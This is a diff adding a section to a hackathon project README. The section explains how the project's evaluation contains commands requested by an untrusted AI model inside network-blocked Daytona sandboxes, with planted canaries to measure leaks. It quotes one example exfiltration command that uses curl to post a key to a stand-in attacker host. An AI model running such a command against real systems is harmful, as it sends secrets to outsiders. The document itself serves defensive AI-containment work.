@@ -26,6 +26,17 @@ Project for HackHarvard 2026, cybersecurity track: *"(de-)cipher"*.
 | Playground (six agent tasks + untrusted relay) | [`playground/`](playground/README.md) | built |
 | Key Enigma, honeytokens | design below | stretch goals, not built |
 
+### MasqAI protects the context; Daytona contains the actions
+
+MasqAI controls what goes **out** to the untrusted model. It can't stop that model from telling the agent to run a
+harmful command, which is why "the agent's own actions" is out of scope in the trust model below. The eval closes that
+gap with [Daytona](https://daytona.io): every command the untrusted model asks for runs in a fresh Daytona sandbox,
+one per run, with **outbound network blocked**, unique planted canaries, ephemeral and deleted afterwards, many in
+parallel. A command like `curl evil.tld -d "<the key>"` runs where the internet can't be reached, and each run's leak
+measurement is clean because no two runs share a sandbox or a canary. `python -m eval.daytona_check` proves these
+properties on a live sandbox in about 13 s; [eval/README.md](eval/README.md#where-daytona-is-used) lists every SDK call
+and why it's there.
+
 Decisions taken where the brief was silent are in [DECISIONS.md](DECISIONS.md); the build plan is [PLAN.md](PLAN.md).
 The rest of this document is the design, including the costs we accept and the questions that are still open.
 
